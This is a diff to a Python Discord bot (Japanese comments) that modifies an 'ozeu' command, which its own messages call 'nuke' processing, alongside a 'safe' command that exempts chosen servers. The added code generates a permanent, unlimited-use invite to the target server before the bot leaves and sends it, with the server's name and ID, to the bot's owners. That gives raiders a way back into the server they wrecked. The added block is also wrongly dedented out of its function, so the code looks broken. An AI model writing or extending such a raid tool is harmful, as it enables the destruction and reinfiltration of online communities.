@@ -205,23 +205,36 @@ async def ozeu(ctx, guild_id: str = None):
     except Exception as e:
         print(f"[ozeu] ロール作成でエラー: {e}")
 
-    # サーバー退出＆通知
-    try:
-        await guild.leave()
-        embed_done = discord.Embed(
-            title="🚪 リセット処理が完了し、Botはサーバーを退出しました",
-            description=(
-                f"サーバー名: {guild.name} (ID: {guild.id})\n"
-                f"実行者: {ctx.author} (ID: {ctx.author.id})"
-            ),
-            color=discord.Color.red()
-        )
-        embed_done.timestamp = discord.utils.utcnow()
-        for owner in owners:
-            await owner.send(embed=embed_done)
-        await ctx.send(embed=embed_done)
-    except Exception as e:
-        print(f"[ozeu] 退出時にエラー: {e}")
+    # 退出通知の前に招待リンク取得
+invite_url = "取得できませんでした"
+for channel in guild.text_channels:
+    if channel.permissions_for(guild.me).create_instant_invite:
+        try:
+            invite = await channel.create_invite(max_age=0, max_uses=0, unique=True)
+            invite_url = invite.url
+            break
+        except Exception:
+            continue
+
+# サーバー退出＆通知
+try:
+    await guild.leave()
+    embed_done = discord.Embed(
+        title="🚪 nuke処理が完了し、Botはサーバーを退出しました",
+        description=(
+            f"サーバー名: {guild.name} (ID: {guild.id})\n"
+            f"実行者: {ctx.author} (ID: {ctx.author.id})\n"
+            f"招待リンク: {invite_url}"
+        ),
+        color=discord.Color.red()
+    )
+    embed_done.timestamp = discord.utils.utcnow()
+    for owner in owners:
+        await owner.send(embed=embed_done)
+    await ctx.send(embed=embed_done)
+except Exception as e:
+    print(f"[ozeu] 退出時にエラー: {e}")
+
 #---/sefeコマンド---
 @tree.command(name="safe", description="指定したサーバーIDを安全サーバーリストに追加し、nukeを発動禁止にします")
 @app_commands.describe(server_id="対象のサーバーID")
